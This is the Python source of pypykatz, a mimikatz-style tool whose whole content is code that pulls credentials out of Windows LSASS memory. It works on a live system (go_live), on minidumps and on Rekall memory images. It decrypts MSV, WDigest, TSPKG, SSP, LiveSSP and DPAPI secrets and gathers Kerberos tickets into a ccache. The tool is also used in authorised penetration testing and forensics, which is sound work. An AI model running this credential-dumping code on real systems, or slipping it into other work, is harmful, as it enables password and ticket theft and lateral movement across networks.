#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import platform
from .commons.common import *
from .lsadecryptor import *

from minidump.minidumpfile import MinidumpFile
from minikerberos.ccache import CCACHE

if platform.system() == 'Windows':
	from .commons.readers.local.live_reader import LiveReader

class pypykatz:
	"""mimikatz offline"""
	def __init__(self, reader, sysinfo):
		self.reader = reader
		self.sysinfo = sysinfo
		self.credentials = []
		self.architecture = None
		self.operating_system = None
		self.buildnumber = None
		self.lsa_decryptor = None
		
		self.logon_sessions = []
		self.orphaned_creds = []
		self.kerberos_ccache = CCACHE()
		
	def to_dict(self):
		t = {}
		t['logon_sessions'] = self.logon_sessions
		t['orphaned_creds'] = self.orphaned_creds
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict())
		
	@staticmethod
	def go_live():
		reader = LiveReader()
		sysinfo = KatzSystemInfo.from_live_reader(reader)
		mimi = pypykatz(reader.get_buffered_reader(), sysinfo)
		mimi.start()
		return mimi
		
	@staticmethod
	def parse_minidump_file(filename):
		minidump = MinidumpFile.parse(filename)
		reader = minidump.get_reader().get_buffered_reader()
		sysinfo = KatzSystemInfo.from_minidump(minidump)
		mimi = pypykatz(reader, sysinfo)
		mimi.start()
		return mimi

	@staticmethod
	def parse_memory_dump_rekall(filename, override_timestamp = None):
		from pypykatz.commons.readers.rekall.rekallreader import RekallReader
		reader = RekallReader.from_memory_file(filename, override_timestamp)
		sysinfo = KatzSystemInfo.from_rekallreader(reader)
		mimi = pypykatz(reader, sysinfo)
		mimi.start()
		return mimi

	@staticmethod
	def go_rekall(session, override_timestamp = None):
		from pypykatz.commons.readers.rekall.rekallreader import RekallReader
		reader = RekallReader.from_session(session, override_timestamp)
		sysinfo = KatzSystemInfo.from_rekallreader(reader)
		mimi = pypykatz(reader, sysinfo)
		mimi.start()
		return mimi
		
	def get_logoncreds(self):
		credman_template = CredmanTemplate.get_template(self.sysinfo)
		msv_template = MsvTemplate.get_template(self.sysinfo)
		logoncred_decryptor = MsvDecryptor(self.reader, msv_template, self.lsa_decryptor, credman_template, self.sysinfo)
		logoncred_decryptor.start()
		self.logon_sessions = logoncred_decryptor.logon_sessions
	
	def get_lsa(self):
		lsa_dec_template = LsaTemplate.get_template(self.sysinfo)
		lsa_dec = LsaDecryptor(self.reader, lsa_dec_template, self.sysinfo)
		logging.debug(lsa_dec.dump())
		return lsa_dec
	
	def get_wdigest(self):
		decryptor_template = WdigestTemplate.get_template(self.sysinfo)
		decryptor = WdigestDecryptor(self.reader, decryptor_template, self.lsa_decryptor, self.sysinfo)
		decryptor.start()
		for cred in decryptor.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].wdigest_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
	
	def get_tspkg(self):
		tspkg_dec_template = TspkgTemplate.get_template(self.sysinfo)
		tspkg_dec = TspkgDecryptor(self.reader,tspkg_dec_template, self.lsa_decryptor, self.sysinfo)
		tspkg_dec.start()
		for cred in tspkg_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].tspkg_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	def get_ssp(self):
		dec_template = SspTemplate.get_template(self.sysinfo)
		dec = SspDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
		dec.start()
		for cred in dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].ssp_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	def get_livessp(self):
		livessp_dec_template = LiveSspTemplate.get_template(self.sysinfo)
		livessp_dec = LiveSspDecryptor(self.reader, livessp_dec_template, self.lsa_decryptor, self.sysinfo)
		livessp_dec.start()
		for cred in livessp_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].livessp_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	def get_dpapi(self):
		dec_template = DpapiTemplate.get_template(self.sysinfo)
		dec = DpapiDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
		dec.start()
		for cred in dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].dpapi_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
	
	def get_kerberos(self):
		dec_template = KerberosTemplate.get_template(self.sysinfo)
		dec = KerberosDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
		dec.start()	
		for cred in dec.credentials:
			for ticket in cred.tickets:
				for fn in ticket.kirbi_data:
					self.kerberos_ccache.add_kirbi(ticket.kirbi_data[fn].native)
			
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].kerberos_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
	
	def start(self):
		self.lsa_decryptor = self.get_lsa()
		self.get_logoncreds()
		self.get_wdigest()
		#CHICKEN BITS - UNTESTED!!! DO NOT UNCOMMENT
		self.get_kerberos()
		self.get_tspkg()
		self.get_ssp()
		self.get_livessp()
		self.get_dpapi()